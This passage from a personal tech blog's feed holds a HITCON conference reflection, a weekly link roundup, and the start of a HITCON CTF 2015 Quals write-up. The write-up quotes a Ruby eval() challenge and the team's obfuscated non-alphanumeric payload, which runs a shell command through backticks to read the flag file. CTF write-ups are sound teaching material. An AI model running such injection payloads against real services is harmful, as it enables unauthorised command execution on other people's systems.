對我這種只把資安當興趣、打過兩次金盾決賽只拿到一次第五名、打 CTF 也沒有太大貢獻的傢伙來說，&lt;br /&gt;
真的已經有種自己跟不上時代的感覺了。  &lt;/p&gt;
&lt;p&gt;個人覺得今年講的比較好的場次是 GD 的 Gogoro 那場，&lt;br /&gt;
還有第二天 Orange 有關 Bug Bounty 的 Keynote（聽完真的會讓我想嘗試看 Bug Bounty）。&lt;br /&gt;
對我來說，現在參加 HITCON 已經有點變成是看這些能力很強的人怎麼努力，然後順便給自己充電的感覺，&lt;br /&gt;
出社會工作以後真的覺得沒有個目標在的話，很容易迷失在庸庸碌碌中。  &lt;/p&gt;
&lt;p&gt;個人覺得今年議程的種類算是蠻平均的，算是各個種類都有一些，&lt;br /&gt;
Ransomware 因為最近一堆 Crypto Ransomware 很猖獗，所以有蠻多場次都與其相關，&lt;br /&gt;
Android 的場次也不少，反觀 iOS 的好像就沒那麼多，然後 Web 好像又更少了。&lt;br /&gt;
這兩年偏新手向的場次也比較多，&lt;br /&gt;
想起第一次來參加 HITCON 的時候，&lt;br /&gt;
我根本每個議程都聽不懂，&lt;br /&gt;
現在的新會眾就比較幸福一些。  &lt;/p&gt;
&lt;p&gt;然後 &lt;a href="https://kb.hitcon.org"&gt;KnowledgeBase&lt;/a&gt; 跟 &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay&lt;/a&gt;，&lt;br /&gt;
也是這兩年左右才開始弄的東西，&lt;br /&gt;
希望可以把台灣的資安發展帶往更好的方向。  &lt;/p&gt;
&lt;p&gt;明年還會不會想參加我自己也不確定，&lt;br /&gt;
出來工作以後其實也沒有說比學生還累，&lt;br /&gt;
但不知道為啥就是已經沒那麼熱血了，&lt;br /&gt;
去年還有玩一下 IoT Wargame 跟 RPi 和攤位的一些活動，&lt;br /&gt;
今年不知為何慵懶到連玩都不太想玩，&lt;br /&gt;
然後 BambooFox 打的一些 CTF 也沒啥心情想參加，&lt;br /&gt;
也許明年還要不要參加就明年到時候再決定吧。  &lt;/p&gt;</summary><category term="HITCON"></category></entry><entry><title>Y2016W28</title><link href="https://blog.m157q.tw/posts/2016/07/17/y2016w28/" rel="alternate"></link><published>2016-07-17T23:48:03+08:00</published><updated>2016-07-17T23:48:03+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-07-17:posts/2016/07/17/y2016w28/</id><summary type="html">&lt;h3&gt;Android&lt;/h3&gt;
&lt;p&gt;昨天把手上的 ZenFone 2 (ZE551ML) 刷成 CM，第一次刷機，收集了一些資料。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.cyanogenmod.org/w/Doc:_fastboot_intro"&gt;Doc: fastboot intro - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rovo89/Xposed"&gt;GitHub - rovo89/Xposed: The native part of the Xposed framework (mainly the modified app_process binary).&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/android#Automatic_installation"&gt;Android - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.cyanogenmod.org/w/Doc:_adb_intro"&gt;Doc: adb intro - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.cyanogenmod.org/w/Install_CM_for_Z00A"&gt;How to Install CyanogenMod on the Asus Zenfone 2 (1080p) ("Z00A") - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.cyanogenmod.org/w/UDEV"&gt;UDEV - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/ansible/playbooks_best_practices.html"&gt;Best Practices — Ansible Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有空好像應該來看一下，半年前學了 ansible 之後一直沒用到，可能最近找看看工作上有沒有地方可以用到吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible-examples"&gt;GitHub - ansible/ansible-examples: A few starter examples of ansible playbooks, to show features and how they work together.  See http://galaxy.ansible.com for example roles from the Ansible community for deploying many popular applications.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloudflare&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.allenchou.cc/cloudflare-user-feel/"&gt;CloudFlare使用心得 | 電腦故我在&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/"&gt;Secure and fast GitHub Pages with CloudFlare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇大概跟我一個月前買 domain name 後用免費版的 CloudFlare 服務弄這個 blog 差不多，只是他用 Jekyll 我用 Pelican，最近應該會來寫篇文章紀錄一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://free.com.tw/getherhim/"&gt;Her/Him 最簡單的交友程式！在 Facebook 上隨機找人匿名聊天&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;蠻有趣的 Facebook Messenger Bot 實作方式，試用了一下，真的有在上面交換到帳號並加好友，不過一開始真的不知道要聊什麼，因為根本沒有對方的資訊，只能自己問。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/10829731/ingesting-logs-into-bigquery-from-a-python-script"&gt;google app engine - Ingesting logs into bigquery from a python script - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來似乎只能先存到 Cloud Storage 再透過 MapReduce 存到 BigQuery，想找看看有沒有 Real-time 的方式，不知道透過 Pub/Sub 可不可行？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/refdocs/google.appengine.api.logservice.logservice"&gt;google.appengine.api.logservice.logservice module  |  Python  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看 GAE 的 Request log 有紀錄了哪些 fields 可以拿來用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dylandy/tobopomo.js"&gt;GitHub - dylandy/tobopomo.js: A simple and easy plugin for convert string to Bopomo script and Chinese Characters.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;打注音但忘記切換輸入法，導致打出來是英數字的時候可以用 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chrislgarry/Apollo-11"&gt;GitHub - chrislgarry/Apollo-11: Original Apollo 11 Guidance Computer (AGC) source code for the command and lunar modules.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;阿波羅十一號用的導航系統的原始碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Go&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/cadvisor"&gt;GitHub - google/cadvisor: Analyzes resource usage and performance characteristics of running containers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Hitcon&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hitcon.org/2016/CMT/#hitcon_agenda"&gt;台灣駭客年會 HITCON CMT 2016&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://imgur.com/a/f0kYP"&gt;[HITCON 2016 的奇葩獎就決定是你了！](http://www.ettoday.net/news/20160713/734459.htm#ixzz4EIJOGwej) - Album on Imgur&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ettoday.net/news/20160713/734459.htm#ixzz4EIJOGwej"&gt;植入一銀ATM3支病毒1指令檔　用來指揮吐鈔和刪除程式 | ETtoday社會新聞 | ETtoday 新聞雲&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;『而 3 支惡意程式都屬「MD5」的格式，所以 ，呼籲有同型 ATM 的銀行業者；要儘快檢查是否有被植入 MD5 的惡意程式。』 笑翻 XDDDDDDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;K8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.kubernetes.io/2016/07/five-days-of-kubernetes-1.3.html"&gt;Kubernetes: Five Days of Kubernetes 1.3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.kubernetes.io/2016/07/dashboard-web-interface-for-kubernetes.html"&gt;Kubernetes: Dashboard - Full Featured Web Interface for Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/dashboard"&gt;GitHub - kubernetes/dashboard: General-purpose web UI for Kubernetes clusters&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://lkml.iu.edu/hypermail/linux/kernel/1607.1/00627.html"&gt;Linux-Kernel Archive: Re: [patch] crypto: sha256-mb - cleanup a || vs | typo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺 Linus 也需要為 Linux kernel source code 弄個像 flake8 這種 syntax checker 了，沒跑過 syntax check 就不准 merge！（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Luigi&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://luigi.readthedocs.io/en/stable/index.html"&gt;Getting Started — Luigi 2.2.0 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;公司有用到 Luigi，最近正在看相關的部份，所以瞭解一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Markdown&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://yhatt.github.io/marp/"&gt;Marp - Markdown Presentation Writer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哦哦！用 Markdown 寫 slides 的即時預覽編輯器，支援 Linux, Mac, Windows，好像不錯耶。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yhatt/marp"&gt;GitHub - yhatt/marp: Markdown presentation writer, powered by Electron.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;第一銀行的 ATM 被植入惡意程式，被兩個俄羅斯人拿走八千萬新台幣的相關。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://orson.tw/2016/07/12/%e6%8a%80%e8%a1%93%e5%88%86%e6%9e%90-%e5%a6%82%e4%bd%95%e9%81%99%e6%8e%a7atm%e5%90%90%e9%8c%a2/"&gt;技術分析 – 如何遙控ATM吐錢 – 綠紅黃白黑&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://orson.tw/2016/07/12/%e9%8d%b5%e7%9b%a4%e6%9f%af%e5%8d%97-%e4%b8%80%e9%8a%80atm%e7%9b%9c%e9%a0%98%e4%ba%8b%e4%bb%b6/"&gt;鍵盤柯南 – 一銀ATM盜領事件 – 綠紅黃白黑&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.techbang.com/posts/44747-millet-electric-mosquito"&gt;小米電蚊香現身！售價約台幣 150 元還可隨身使用 | T客邦 - 我只推薦好東西&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.othree.net/log/2016/07/16/hkoscon-2016/"&gt;HKOSCON 2016 : O3noBLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「就是大概進入 COSCUP 開始辦之後，參與發展在地化的自由開源軟體的人卻越來越少」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Headphone/M.1468381706.A.46D.html"&gt;Re: [討論] SSD的音質 - 看板 Headphone - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=wZHEVPxhR8c&amp;amp;feature=youtu.be"&gt;【今周刊】圖解新聞：彭淮南如何影響你的荷包？ - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;簡單易懂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tool&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.flash-to-html5.net/"&gt;Free Flash to HTML5 Online Converter&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%97%8F%E6%9B%B8%E7%A5%A8"&gt;藏書票 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「藏書票可以說一種小型的版畫，本來是用來貼在書本封面內外，作為自己藏書的標誌，和藏書印一樣。」原來有這種東西呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Luigi"></category><category term="Jkyell"></category><category term="K8s"></category><category term="Go"></category><category term="Joke"></category><category term="Ptt"></category><category term="Tool"></category><category term="Facebook"></category><category term="GAE"></category><category term="Ansible"></category><category term="Linux"></category><category term="Cloudflare"></category><category term="Github"></category><category term="Hitcon"></category><category term="Misc"></category><category term="Markdown"></category><category term="Taiwan"></category><category term="Trivia"></category><category term="Android"></category><category term="Opensource"></category></entry><entry><title>HITCON CTF 2015 Quals Write-up</title><link href="https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" rel="alternate"></link><published>2015-10-19T11:42:55+08:00</published><updated>2015-10-19T11:42:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-19:posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</id><summary type="html">&lt;h2&gt;MISC - Flag not Found [1]&lt;/h2&gt;
&lt;p&gt;Any &lt;code&gt;404 Nout Found&lt;/code&gt; page on &lt;a href="https://ctf2015.hitcon.org"&gt;https://ctf2015.hitcon.org&lt;/a&gt; will print out the flag.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png" /&gt;  &lt;/p&gt;
&lt;p&gt;The flag is &lt;code&gt;hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;MISC - hard to say [50*4]&lt;/h2&gt;
&lt;p&gt;A description  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ruby on Fails.  
FLAG1: nc 54.199.215.185 9001  
FLAG2: nc 54.199.215.185 9002  
FLAG3: nc 54.199.215.185 9003  
FLAG4: nc 54.199.215.185 9004  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;with a Ruby source code &lt;code&gt;hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby  &lt;/span&gt;

&lt;span class="nb"&gt;fail&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flag?&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="vg"&gt;$stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;  

&lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;to_i&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hi, I can say &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; bytes :P&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="vg"&gt;$stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip!&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="sr"&gt;/[[:alnum:]]/&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
  &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;oh... I cannot say this, maybe it is too long or too weird :(&amp;#39;&lt;/span&gt;  
  &lt;span class="nb"&gt;exit&lt;/span&gt;  
&lt;span class="k"&gt;end&lt;/span&gt;  

&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I think size = &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; is ok to me.&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_s&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;..-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The program will accept an input.  &lt;/li&gt;
&lt;li&gt;There's a flag at &lt;code&gt;./flag&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;There's a input length limit which has been assigned as argv[0] since the program started.  &lt;ul&gt;
&lt;li&gt;For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;You cannot have alphabets and numbers in the input.  &lt;/li&gt;
&lt;li&gt;If your input pass the length and non-alnum test, it will be the argument of &lt;code&gt;eval()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;The program print out the result of &lt;code&gt;eval(input)&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Flag1 (1024 bytes)&lt;/h3&gt;
&lt;p&gt;At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.&lt;br /&gt;
Until one of my teammates gave a link &lt;a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/"&gt;Non-Alphanumeric Ruby for Fun and Not Much Else&lt;/a&gt;.&lt;br /&gt;
After some discussions, try-and-error and with this link &lt;a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby"&gt;Calling shell commands from Ruby - Stack Overflow&lt;/a&gt;,&lt;br /&gt;
we came up with &lt;code&gt;226 bytes&lt;/code&gt; solution for flag1.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
